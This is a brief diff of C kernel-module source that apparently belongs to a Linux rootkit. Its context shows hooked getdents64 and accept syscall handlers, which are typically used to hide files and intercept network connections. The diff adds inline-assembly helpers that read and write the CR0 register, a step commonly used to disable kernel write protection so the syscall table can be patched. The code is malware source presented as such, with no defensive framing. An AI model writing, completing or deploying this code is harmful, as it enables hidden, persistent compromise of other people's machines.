@@ -116,6 +116,16 @@ asmlinkage long hooked_getdents64(const struct pt_regs *pt_regs) {
     return ret;
 }
 
+unsigned long read_cr0(void) {
+    unsigned long cr0;
+    asm volatile ("mov %%cr0, %0" : "=r" (cr0));
+    return cr0;
+}
+
+void write_cr0(unsigned long cr0) {
+    asm volatile ("mov %0, %%cr0" : : "r" (cr0));
+}
+
 asmlinkage long hooked_accept(const struct pt_regs *pt_regs) {
     int ret;
     struct sockaddr_in addr;
